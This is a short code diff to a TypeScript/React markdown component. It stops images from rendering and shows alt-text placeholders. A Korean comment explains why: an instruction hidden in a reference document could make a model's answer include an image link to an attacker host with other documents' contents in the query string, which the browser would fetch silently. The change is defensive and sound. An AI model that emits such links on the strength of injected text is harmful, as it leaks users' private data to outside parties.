@@ -63,6 +63,16 @@ const components: Components = {
   ),
   td: ({ children }) => <td className="border-b border-slate-100 px-3 py-1.5 align-top">{children}</td>,
   hr: () => <hr className="my-3 border-slate-200" />,
+  /**
+   * 이미지는 그리지 않는다. `![](https://공격자/x?d=…)` 가 답변에 섞이면 브라우저가 클릭 없이 그 주소를 GET 하므로,
+   * 참고 문서에 숨긴 지시로 모델을 유도해 다른 문서 내용을 쿼리스트링에 실어 보내는 유출 경로가 된다.
+   * 답변에 이미지가 필요한 경우는 없고, 대신 대체 텍스트만 남긴다. CSP img-src 도 함께 제한한다(next.config.ts).
+   */
+  img: ({ alt }) => (
+    <span className="rounded bg-slate-100 px-1.5 py-0.5 text-[13px] text-slate-500">
+      [이미지 생략{alt ? `: ${alt}` : ""}]
+    </span>
+  ),
 };
 
 export function Markdown({ text }: { text: string }) {
